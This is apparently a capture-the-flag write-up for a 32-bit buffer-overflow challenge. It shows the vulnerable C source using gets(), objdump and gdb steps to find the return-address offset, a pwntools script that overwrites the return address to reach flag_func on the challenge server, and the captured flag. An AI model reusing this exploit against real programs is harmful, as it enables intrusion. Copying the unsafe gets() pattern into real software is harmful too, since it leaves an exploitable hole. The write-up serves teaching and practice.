# Control the flow
nc chal.firebird.sh 33002

1. From the source code, we can see gets() in fncno_1, flag_func exists for flag => attempt for buffer overflow to override the return address for fncno_1 returning to main -> change to flag_func
```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>

char flag[25];
void flag_func(){

  FILE *f = fopen("flag_rp.txt", "r");
  if (f == NULL) {
    printf("flag file is missing\n");
    exit(0);
  }

  fgets(flag, 25, f);
  printf("%s\n", flag);	

}


void fncno_1(){
  char buf[250];
  gets(buf);

  printf("%s\n", buf);


}

int main(int argc, char **argv){
setbuf(stdout,NULL);
gid_t gid = getegid();                           
setresgid(gid, gid, gid);

  puts("We fired the last programmer. Type something in and I'll repeat it to you, but I still can't remember too many things...\n");
  fncno_1();
  return 0;
}

```

2. Find the function pointer address of flag_func:
```
objdump -M intel -d return_pointer
```
We can see that for flag_func, its address: 0x080485b6

3. Attempt to build the code to try so as find the length of string need to write for overflow:
```
gcc -m32 return_pointer.c -g -o demo1 -fno-stack-protector -no-pie
objdump -M intel -d demo1
```
- After that, using gdb, run with the input cauing overflow
e.g. AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAabcdefghijklmnopqr

- Check that where it will override EIP (return address for function) -> Invalid PC address error should be seen

4. Create a Python script using pwn library to solve this problem
```Python
from pwn import *

context.log_level = 'DEBUG'

# p = process('./demo1')
p= remote('chal.firebird.sh', 33002)

win = 0x080485b6

buf = b'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAabcdefghijklm' + p32(win)

p.recvline()
p.sendline(buf)
p.interactive()
```

5. Execute it with python
```
python3 solve.py
```

![alt text](https://github.com/div1121/OIL_Test/blob/main/Control_the_flow/img1.png)

![alt text](https://github.com/div1121/OIL_Test/blob/main/Control_the_flow/img2.png)

Flag obtained:
flag{th15_1s_4_gd_st4rt}
